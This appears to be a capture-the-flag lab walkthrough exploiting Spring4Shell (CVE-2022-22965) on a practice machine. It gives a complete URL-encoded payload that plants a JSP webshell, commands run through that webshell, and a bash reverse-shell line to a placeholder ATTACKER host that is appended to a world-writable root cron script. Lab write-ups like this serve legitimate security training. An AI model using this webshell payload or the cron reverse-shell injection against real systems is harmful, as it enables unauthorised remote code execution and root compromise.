# Machine 02: SpringBreak — CVE-2022-22965 Walkthrough

## Recon
```bash
nmap -sC -sV 10.10.2.10
# PORT 8080/tcp open http Apache Tomcat
```

## Enumeration
```bash
curl http://10.10.2.10:8080/actuator
# Reveals Spring Boot actuator endpoints — confirms Spring Framework
```

## Exploitation (Spring4Shell)
```bash
# Write JSP webshell via class loader manipulation
curl "http://10.10.2.10:8080/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7Bout.println(new%20String(b))%3B%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# Access webshell
curl "http://10.10.2.10:8080/shell.jsp?pwd=j&cmd=id"
# uid=1001(tomcat)

# Get user flag
curl "http://10.10.2.10:8080/shell.jsp?pwd=j&cmd=cat+/home/user/user.txt"
```

## Privilege Escalation
```bash
# Find writable cron scripts
curl "http://10.10.2.10:8080/shell.jsp?pwd=j&cmd=ls+-la+/etc/cron.d/"
curl "http://10.10.2.10:8080/shell.jsp?pwd=j&cmd=ls+-la+/opt/scripts/backup.sh"
# -rwxrwxrwx backup.sh — writable by everyone, runs as root!

# Inject reverse shell into cron script
curl "http://10.10.2.10:8080/shell.jsp?pwd=j&cmd=echo+'bash+-i+>%26+/dev/tcp/ATTACKER/9001+0>%261'+>>+/opt/scripts/backup.sh"

# Wait for cron execution, catch root shell
# cat /root/root.txt
```
